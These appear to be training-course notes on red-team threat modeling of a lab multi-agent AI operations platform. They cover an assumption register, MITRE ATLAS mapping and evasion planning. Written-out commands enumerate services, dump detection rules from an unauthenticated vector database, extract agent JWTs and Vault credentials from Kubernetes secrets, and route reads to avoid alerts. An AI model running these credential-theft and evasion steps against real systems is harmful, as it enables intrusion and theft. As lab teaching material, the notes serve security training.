# Module 10 — Threat Modeling for AI-Enabled Targets

## Overview
Threat modeling for AI systems is intelligence-led offensive planning. Rather than firing attacks immediately, a red teamer builds an assumption register — tracking what they believe about the target, at what confidence level, and whether evidence has validated or invalidated each assumption. Every recon action either validates a hypothesis or forces a model update. ATLAS technique IDs are mapped to components only when preconditions are confirmed, ensuring tradecraft selection is driven by evidence rather than guesswork. The lab target is Nexus AI: a multi-agent AIOps platform with an Orchestrator, four agents (Triage, Remediation, Security, Knowledge), an MCP server, Qdrant vector DB, MLflow, and HashiCorp Vault.

---

## Core Concepts

### The Assumption Register
The central artifact of AI threat modeling. Every hypothesis about the target is recorded as an entry with:

```
ID | Observation | Hypothesis | Confidence (LOW/MEDIUM/HIGH) | Source | Status (UNVALIDATED/VALIDATED/INVALIDATED)
```

**Operational discipline:**
- OSINT starts as MEDIUM confidence, UNVALIDATED — never treat it as fact
- LOW confidence entries (especially absence-of-evidence assumptions) get verified early
- When a hypothesis is INVALIDATED, record what it implies and generate new entries
- The register is a living document — every recon action triggers at least one update

### Trust Boundaries
Numbered boundaries between components. Exploitable boundaries are the attack surface:
- **TB-1** — Alerts → Orchestrator (alert injection if no auth)
- **TB-3** — Agents → Qdrant (data exfil, staging poisoning)
- **TB-4** — Agents → MCP Server (stolen token + crafted parameters)
- **TB-5** — MCP Server → Vault (AppRole credential collapse)
- **TB-7** — Triage Agent → Orchestrator (adversarial alert classification)
- **TB-8** — Knowledge Agent → Agents (RAG poisoning via staging Qdrant)

### Crown Jewels Ranking
Rank assets by: (1) offensive impact, (2) current access level, (3) number of trust boundaries between attacker and asset, (4) confidence in ranking accuracy.

| Rank | Asset | Location | Access |
|------|-------|----------|--------|
| 1 | AWS credentials | Vault → MCP Server | Behind 3 boundaries |
| 2 | Detection rules | Qdrant `:6333` | **OBTAINED** |
| 3 | Runbook corpus | Qdrant `:6333` | Accessible |
| 4 | Agent identity tokens | K8s secrets | **OBTAINED** |
| 5 | Model weights | MLflow `:5000` | Unvalidated |
| 6 | MCP tool schemas | MCP Server `:9005` | **OBTAINED** |

### MITRE ATLAS Mapping
Map confirmed components to ATLAS technique IDs. Techniques are not added to the active plan until preconditions are confirmed.

| ATLAS ID | Technique | Precondition |
|----------|-----------|-------------|
| AML.T0020 | Poison Training Data | Staging Qdrant write access |
| AML.T0025 | Exfiltration via Cyber Means | Qdrant unauthenticated (validated) |
| AML.T0040 | Inference API Access | Agent HTTP endpoint reachability |
| AML.T0043 | Craft Adversarial Data | TB-1 auth status |
| AML.T0044 | ML Model Access | MLflow auth status |
| AML.T0085 | Data from AI Services | Remediation token in hand |
| AML.T0010 | AI Supply Chain Compromise | MLflow write access |

---

## Attack Techniques

### Technique 1 — Architecture Reconstruction from Incomplete Information
**What it is:** Building a validated component map from OSINT + active recon before touching any attack surface.  
**How it works:**
1. Passive OSINT — LinkedIn job postings reveal tech stack (MLflow, Qdrant, Vault, K8s); employee profiles show integrations; GitHub forks leak tool names
2. Active network discovery — `nmap -sV -p- --open -T4 <subnet>`
3. MCP tool enumeration — `curl /tools` reveals full tool surface (found hidden `vault_rotate_secret`)
4. Qdrant collection enumeration — `curl /collections` validates unauthenticated access
5. K8s secret listing — maps credential surface per agent

**When to use it:** Beginning of every AI engagement — defines the attack surface before any offensive action.

**Example:**
```bash
# Step 1: Full subnet sweep
nmap -sV -p- --open -T4 10.10.50.0/24

# Step 2: MCP tool surface
curl -s http://10.10.50.15:9005/tools | jq '.tools[] | {name, description}'

# Step 3: Qdrant auth check
curl -s http://10.10.50.20:6333/collections | jq '.result.collections[].name'

# Step 4: K8s secret listing (grey-box token)
kubectl --token=$K8S_TOKEN get secrets -n nexus-ai \
  -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}'
```

**Nexus lab result:** 9 services across 9 hosts; 4 agents (not 3 as assumed); `vault_rotate_secret` tool hidden from OSINT; Qdrant fully unauthenticated; 4 agent JWT tokens in K8s secrets; Vault AppRole creds in K8s.

**Notes / Gotchas:**
- OSINT counts are unreliable — always validate agent count via active recon
- Hidden tools (not in README/OSINT) may be the highest-value attack paths
- Qdrant auth absence is a critical misconfiguration — validate early

---

### Technique 2 — Assumption Register Lifecycle Management
**What it is:** Iterative update of a structured hypothesis tracker as evidence arrives.  
**How it works:** Every observation triggers a register update: UNVALIDATED → VALIDATED or INVALIDATED. Invalidation generates new hypotheses.

**Example — A-07 validation (Qdrant unauthenticated):**
```bash
curl -s http://10.10.50.20:6333/collections | jq '.'
# → HTTP 200 with collection list, no auth challenge → A-07 VALIDATED
```

**Example — A-08 invalidation (flat credential model):**
```bash
# Triage agent token rejected for vault_rotate_secret
curl -s http://10.10.50.15:9005/invoke -X POST \
  -H "Authorization: Bearer <TRIAGE_TOKEN>" \
  -d '{"tool": "vault_rotate_secret", "params": {"secret_path": "secret/nexus/test_canary"}}'
# → {"status": "error", "message": "Agent triage not authorized for tool vault_rotate_secret"}
# → A-08 INVALIDATED: per-agent scoping confirmed, not flat credential model
```

**Notes / Gotchas:**
- Absence of evidence ≠ evidence of absence — LOW confidence entries for absent controls must be actively validated, not assumed correct
- Invalidation is not failure — it produces more accurate intelligence

---

### Technique 3 — Iterative Threat Model Updates
**What it is:** Three distinct update cycles keyed to recon phases.

**After active recon:**
- A-02 VALIDATED (4 agents, not 3)
- A-07 VALIDATED (Qdrant unauthenticated)
- `vault_rotate_secret` discovered → A-10 added
- Per-agent scoping confirmed → A-08 revised

**After detection rule extraction (intelligence goldmine):**
```bash
# Extract all detection rules from Qdrant
curl -s http://10.10.50.20:6333/collections/detection_rules/points/scroll \
  -X POST -H "Content-Type: application/json" \
  -d '{"limit": 100, "with_payload": true, "with_vector": false}' | \
  jq '.result.points[].payload.rule_name'
```

Rules extracted and their register impact:
- `nexus-mcp-002`: `vault_rotate_secret` blocked outside maintenance window → A-12 VALIDATED (timing constraint)
- `nexus-qdrant-004`: bulk read from non-agent IP triggers alert → A-13 VALIDATED (our own Phase 2 recon may have triggered this)
- `nexus-agent-003`: direct agent-to-agent comms flagged → A-14 VALIDATED (must route through Orchestrator)
- No parameter monitoring rule found → A-15 added MEDIUM confidence (monitoring gap)

**Notes / Gotchas:**
- Extracting detection rules from the target's own vector DB is OPSEC intelligence — read these before taking noisy actions
- The absence of a detection rule for parameter content (A-15) directly enables prompt injection paths

---

### Technique 4 — Crown Jewel Extraction
**What it is:** Prioritised retrieval of high-value intelligence assets based on trust boundary mapping.

**Detection rules (CJ #2) — extracted from unauthenticated Qdrant:**
```bash
curl -s http://10.10.50.20:6333/collections/detection_rules/points/scroll \
  -X POST -H "Content-Type: application/json" \
  -d '{"limit": 100, "with_payload": true, "with_vector": false}' | jq '.'
```

**Agent tokens (CJ #4) — extracted from K8s:**
```bash
kubectl --token=$K8S_TOKEN get secret nexus-remediation-agent-token -n nexus-ai \
  -o jsonpath='{.data.token}' | base64 -d
# → JWT with "agent": "remediation", "scope": ["vault_rotate_secret", ...]
```

**Vault AppRole credentials (bonus loot):**
```bash
kubectl --token=$K8S_TOKEN get secret nexus-mcp-vault-approle -n nexus-ai \
  -o json | jq '.data | map_values(@base64d)'
# → role_id + secret_id → direct Vault access bypassing MCP Server
```

**Notes / Gotchas:**
- Agent JWT `scope` claim reveals which MCP tools that agent can invoke — decode every token
- Vault AppRole creds provide direct Vault access without going through MCP Server (bypasses TB-4, TB-5 entirely)
- Detection rules obtained from the target's own Qdrant are more reliable than assumed monitoring posture

---

### Technique 5 — OPSEC-Aware Action Planning
**What it is:** Mapping each planned action to its noise level and the detection rules that would trigger, then ordering actions to minimise detection risk.

**Noise level table:**
| Action | Noise | Triggering Rule | Mitigation |
|--------|-------|-----------------|------------|
| `nmap -T4` full scan | HIGH | Network IDS | Use `-T2`, known ports only |
| Qdrant bulk read from attack host | MEDIUM | `nexus-qdrant-004` | Route via agent pod IP |
| MCP tool invocation | MEDIUM–HIGH | `nexus-mcp-001` | Business hours; match agent cadence |
| `vault_rotate_secret` outside maintenance | HIGH | `nexus-mcp-002` | Schedule for maintenance window |
| `vault_rotate_secret` in maintenance window | LOW | None | Preferred execution window |
| `aws_cli_exec` with IAM commands | HIGH | `nexus-aws-005` | Use STS/SSM non-IAM commands |
| Direct agent-to-agent comms | HIGH | `nexus-agent-003` | Always route through Orchestrator |
| Staging Qdrant write `:16333` | LOW | None extracted | RoE permits |

**Notes / Gotchas:**
- The attacker's own Phase 2 Qdrant reads likely triggered `nexus-qdrant-004` — awareness of this shapes remediation
- `aws_cli_exec` starts a 24hr reporting clock — validate all other actions before invoking it
- Routing reads through a pod IP (from `kubectl exec`) bypasses the non-agent-IP detection rule

---

## Tools Used
| Tool | Purpose | Basic Usage |
|------|---------|-------------|
| nmap | Network service discovery | `nmap -sV -p- --open -T4 <subnet>` |
| kubectl | K8s API access with grey-box token | `kubectl --token=$K8S_TOKEN get secrets -n nexus-ai` |
| curl + jq | Service endpoint enumeration and data extraction | `curl -s <endpoint> \| jq '.'` |
| trufflehog | Credential scanning in container images / git repos | `trufflehog docker --image <image>` |
| gitleaks | Git repo secret scanning | `gitleaks detect --source ./repo` |
| MITRE ATLAS Navigator | Visual ATLAS technique mapping | Online tool at atlas.mitre.org |

---

## Lab Notes
**Environment:** Nexus AI — 10.10.50.0/24 subnet, 9 hosts

**Day 1 — OSINT:**
- LinkedIn: MLflow, Qdrant, K8s, Vault, MCP integrations identified
- GitHub fork `megacorpfs/nexus-mcp-tools`: tool names leaked in README (`aws_cli_exec`, `snow_create_ticket`, `datadog_query` — but NOT `vault_rotate_secret`)

**Day 2 — Active Recon:**
- `nmap -sV -p- --open -T4 10.10.50.0/24` → 9 services mapped (4 agents, not 3 — Knowledge Agent standalone)
- Qdrant `/collections` → unauthenticated: `detection_rules`, `runbook_corpus`, `incident_history`, `operational_knowledge`
- MCP `/tools` → `vault_rotate_secret` revealed (hidden from OSINT)
- K8s secrets → all 4 agent JWTs extracted + Vault AppRole creds (`nexus-mcp-vault-approle`)
- Detection rules extracted: 5 rules covering MCP, Qdrant, AWS, agent comms

**Key credentials:**
- Remediation agent JWT: `agent=remediation`, `scope=["vault_rotate_secret", ...]`
- Vault AppRole: `role_id` + `secret_id` from K8s secret `nexus-mcp-vault-approle`
- Staging Qdrant write: `:16333` (no auth, RoE permits)

---

## Attack Chain Summary
OSINT (LinkedIn/GitHub) → Active recon (`nmap`) → Service enumeration (Qdrant/MCP/K8s) → Crown jewel extraction (detection rules → evasion intelligence, agent tokens → tool invocation, Vault AppRole → direct Vault access) → ATLAS-mapped attack path selection → Maintenance window execution of `vault_rotate_secret` → AWS credential extraction

---

## Cross-Module Connections
- **Module 03 (Attacking AI Agents):** Stolen JWT tokens from this module enable direct MCP tool invocation — same pattern as agent token abuse in Module 03
- **Module 05 (RAG Pipelines):** Staging Qdrant write `:16333` enables RAG poisoning (AML.T0020) — direct application of Module 05 techniques
- **Module 07 (MCP and Tool Surfaces):** `vault_rotate_secret` and `aws_cli_exec` are MCP tool surfaces — Module 07 techniques apply directly
- **Module 09 (Infrastructure):** Kubernetes service account token extraction follows the same pattern as Module 09's SA token theft; Vault AppRole = credential hunting
- **Module 11 (Capstone):** This module's assumption register discipline is the capstone methodology — all modules feed the register

---

## Exam Gotchas
- **OSINT is never VALIDATED** — it is MEDIUM confidence, UNVALIDATED until actively confirmed
- **Absence of evidence ≠ absence of control** — A-07 (Qdrant unauthenticated) started LOW confidence because client docs didn't mention auth — not because that meant it was unprotected
- **Detection rules from the target's own system are the primary evasion intelligence source** — extract from Qdrant before taking noisy actions
- **A-08 invalidation is a feature** — discovering per-agent scoping (not flat credentials) enables precision token selection
- **`aws_cli_exec` starts a 24hr reporting clock** — always the last high-noise action taken
- **Vault AppRole creds in K8s bypass MCP entirely** — direct Vault access, not through TB-4/TB-5
- **`vault_rotate_secret` has a maintenance window constraint** — timing matters
- **ATLAS technique IDs require confirmed preconditions** — don't map a technique until the component is validated
